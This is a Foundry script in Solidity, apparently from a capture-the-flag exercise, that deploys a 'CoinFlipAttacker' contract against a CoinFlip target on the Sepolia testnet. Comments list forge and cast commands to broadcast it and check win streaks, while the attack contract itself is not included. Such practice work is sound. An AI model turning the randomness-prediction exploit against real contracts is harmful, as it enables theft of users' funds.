// SPDX-License-Identifier: MIT

pragma solidity >=0.8.24;

import {Script} from "forge-std/Script.sol";
import {CoinFlipAttacker} from "./attacker.sol";
import {console} from "forge-std/Test.sol";

contract Attacker is Script {
    address public target = 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d;
    string SEPOLIA_RPC = "wss://sepolia.drpc.org";
    uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external returns (CoinFlipAttacker) {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.createSelectFork(SEPOLIA_RPC);

        vm.startBroadcast(privateKey);

        CoinFlipAttacker attacker = new CoinFlipAttacker(target);
        console.log("Attacker contract deployed at:", address(attacker));
        
        vm.stopBroadcast();

        return attacker;
    }
}

// # First, source your .env file
// source .env

// To run the script:
// forge script Level4/attacker.s.sol --broadcast --rpc-url wss://sepolia.drpc.org

// # Cast call for the contract
// cast send 0xA7C33DBc9cb868A6Ba6d8F62cfd3F64EE9Ca4707 "flip()" --rpc-url wss://sepolia.drpc.org --private-key $PRIVATE_KEY

// To check consecutive wins:
// cast call 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d "consecutiveWins()(uint256)" --rpc-url wss://sepolia.drpc.org